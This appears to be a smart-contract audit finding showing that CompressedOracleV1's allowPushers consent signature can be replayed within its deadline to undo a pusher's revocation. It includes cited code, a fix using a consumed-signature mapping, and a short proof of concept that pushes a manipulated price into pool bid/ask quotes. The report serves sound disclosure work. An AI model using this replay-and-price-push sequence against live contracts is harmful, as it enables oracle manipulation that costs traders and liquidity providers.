### Title
`allowPushers` Consent Signature Is Replayable Within Its Deadline Window, Allowing a Creator to Re-Establish Delegation After a Pusher Revokes — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 consent signature but never marks that signature as consumed. Because the only replay barrier is the deadline timestamp, the creator can call `allowPushers` again with the **same signature** at any point before the deadline expires — including immediately after the pusher calls `revokePusher`. The pusher's self-revocation is therefore not final: the creator can silently undo it, keeping the pusher's key bound to the creator's namespace for the full deadline window. If the pusher's key is compromised during that window, the attacker retains write authority over the creator's price feeds, which flow directly into pool swaps via `AnchoredPriceProvider.getBidAndAskPrice()`.

---

### Finding Description

`allowPushers` builds a hash over `(chainid, address(this), deadline, pusher, msg.sender)` and recovers the signer:

```solidity
// CompressedOracle.sol L204-209
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no `usedSignatures` bitmap, no per-pusher nonce, and no state written that would cause a second call with the same `(deadline, pusher, creator, sig)` tuple to fail. `_ensureDeadline` only checks `block.timestamp <= deadline`:

```solidity
// OracleBase.sol L124-126
function _ensureDeadline(uint256 deadline) internal view virtual {
    require(block.timestamp <= deadline, DeadlineExceeded());
}
``` [2](#0-1) 

`revokePusher` clears the mapping:

```solidity
// CompressedOracle.sol L238-243
function revokePusher() external {
    address creator = namespaceRemapping[msg.sender];
    if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
    namespaceRemapping[msg.sender] = address(0);
    emit PusherRevoked(msg.sender, creator);
}
``` [3](#0-2) 

But because the original signature is still valid (deadline not yet expired), the creator can immediately call `allowPushers` again with the identical `(deadline, pusher, sig)` arguments, writing `namespaceRemapping[pusher] = creator` back. The code comment in `allowPushers` acknowledges the deadline is the only guard against post-revocation replay, but it only prevents replay **after** the deadline — not within the window:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [4](#0-3) 

The comment correctly identifies the risk but the mitigation (deadline) only closes the post-expiry window, not the intra-deadline replay window.

**Fallback push path** resolves the namespace from `namespaceRemapping[msg.sender]` at call time:

```solidity
// CompressedOracle.sol L315-316
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

So once the mapping is restored, every subsequent fallback call from the compromised pusher key writes into the creator's namespace, overwriting legitimate price data with attacker-controlled values.

Those values are then consumed by `AnchoredPriceProvider._readLeg`, which calls `IPricedOracle(address(offchainOracle)).price(feedId, msg.sender)` — the `CompressedOracleV1.price` path — and uses the returned `mid` as the anchor for the bid/ask band. A manipulated `mid` shifts the entire band, so the clamp does not protect against a corrupted anchor:

```solidity
// AnchoredPriceProvider.sol L280
(mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);
``` [6](#0-5) 

---

### Impact Explanation

A compromised pusher key that has been revoked by the pusher can be silently re-delegated by the creator (intentionally or via an automated keeper that re-establishes delegation on any revocation event). The attacker then pushes an arbitrary price into the creator's namespace. `AnchoredPriceProvider` reads that price as the anchor mid and computes bid/ask relative to it. The pool executes swaps at the manipulated bid/ask, causing traders to receive incorrect amounts and the pool to become insolvent relative to its LP claims. This matches the **bad-price execution** and **pool insolvency** impact categories.

---

### Likelihood Explanation

The trigger requires two conditions: (1) a pusher key compromise and (2) the creator re-establishing delegation (either maliciously or via automation) before the deadline expires. Condition (2) is realistic because operators commonly automate delegation management. Deadlines are typically set days to weeks in the future to avoid operational friction, leaving a large window. The creator's `allowPushers` call is permissionless (no admin gate) and costs only gas.

---

### Recommendation

Track consumed signatures with a `mapping(bytes32 => bool) private _usedConsents` keyed on the full consent hash. Mark the hash as used on first acceptance and revert on any subsequent call with the same hash:

```solidity
mapping(bytes32 => bool) private _usedConsents;

// inside allowPushers, after recovering the signer:
bytes32 consentHash = keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender));
require(!_usedConsents[consentHash], "consent already used");
_usedConsents[consentHash] = true;
```

This ensures each signed consent can establish delegation exactly once. A pusher who revokes can then only be re-delegated by signing a fresh consent with a new deadline, giving the pusher full unilateral control over their revocation.

---

### Proof of Concept

```solidity
// 1. Pusher signs consent with deadline = now + 30 days
bytes memory sig = pusher.sign(keccak256(abi.encode(
    block.chainid, address(oracle), deadline, pusherAddr, creatorAddr
)));

// 2. Creator establishes delegation
oracle.allowPushers(deadline, [pusherAddr], [sig]);
// namespaceRemapping[pusherAddr] == creatorAddr ✓

// 3. Pusher's key is compromised; pusher self-revokes
vm.prank(pusherAddr);
oracle.revokePusher();
// namespaceRemapping[pusherAddr] == address(0) ✓

// 4. Creator (or keeper) replays the SAME signature — still valid, deadline not expired
vm.prank(creatorAddr);
oracle.allowPushers(deadline, [pusherAddr], [sig]);
// namespaceRemapping[pusherAddr] == creatorAddr again ✓

// 5. Attacker (holding compromised key) pushes manipulated price into creator namespace
uint56 tsMs = uint56(block.timestamp * 1000 + 1); // newer timestamp
uint48 badRaw = _packRaw(9_999_999, 1, 1);        // extreme price
vm.prank(pusherAddr); // attacker
(bool ok,) = address(oracle).call(_wordAt(slotId, pos, badRaw, tsMs));
assertTrue(ok);

// 6. AnchoredPriceProvider reads the manipulated mid and returns a shifted bid/ask to the pool
(uint128 bid, uint128 ask) = pool.getBidAndAskPrice();
// bid/ask are now anchored to the attacker-controlled price
``` [7](#0-6) [8](#0-7) [9](#0-8)

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-212)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L311-344)
```text
    fallback() override external {
        uint256 end;
        uint256 namespace;

        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }

        // 4 * 6 + 7 + 1 = 32 bytes per slot
        if (end == 0 || end % 32 != 0) revert BadCalldataLength();

        for (uint256 ptr = 0; ptr < end; ptr += 32) {
            uint256 word;
            assembly ("memory-safe") {
                word := calldataload(ptr)
            }
            // casting to 'uint8' is safe we want LSB
            // forge-lint: disable-next-line(unsafe-typecast)
            uint8 slotId = uint8(word);
            TimeMs timestampMs = toTimeMs(word >> 8 & X56);
            timestampMs.revertIfAfterBlockTimeWithDrift(MAX_TIME_DRIFT);
            bytes32 key = bytes32(namespace | uint256(slotId));
            uint256 old = uint256(_loadStorage(key));
            TimeMs oldTimestampMs = toTimeMs(old >> 8 & X56);

            bool newer = timestampMs.isAfter(oldTimestampMs);
            if (!newer) continue;

            _writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L258-295)
```text
    function _getBidAndAskPrice() internal returns (uint128, uint128) {
        (uint256 mid, uint256 spreadBps, , bool ok) = _readLeg(baseFeedId);
        if (!ok) return (0, type(uint128).max);

        bytes32 _quote = quoteFeedId;
        if (_quote != bytes32(0)) {
            (uint256 mid2, uint256 spreadBps2, , bool ok2) = _readLeg(_quote);
            if (!ok2 || mid2 == 0) return (0, type(uint128).max);
            // Synthetic ratio (8-decimal): mid1 / mid2. Relative uncertainties of a ratio add.
            mid = Math.mulDiv(mid, ORACLE_DECIMALS, mid2);
            spreadBps += spreadBps2;
        }

        return _computeBidAsk(mid, spreadBps);
    }

    /// @dev Reads one feed and runs its per-leg guards. ok=false (→ caller halts, fail closed) on:
    ///      stale reference, mid == 0, spreadBps == the off-hours/stall marker (spreadBps >= ORACLE_BPS), or a
    ///      priceGuard violation. Each leg is read through the attributed path independently.
    function _readLeg(bytes32 feedId)
        internal returns (uint256 mid, uint256 spreadBps, uint256 refTime, bool ok)
    {
        (mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);

        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);

        // Basic validity — mid positive, spreadBps not the stalled/off-hours marker (the Chainlink oracle
        // writes spreadBps = ORACLE_BPS when an RWA market is closed).
        if (mid == 0 || spreadBps >= ORACLE_BPS) return (mid, spreadBps, refTime, false);

        // Per-leg price guard.
        (uint128 guardMin, uint128 guardMax) = offchainOracle.priceGuard(feedId);
        guardMax = guardMax == 0 ? type(uint128).max : guardMax;
        if (mid < guardMin || mid > guardMax) return (mid, spreadBps, refTime, false);

        ok = true;
    }
```
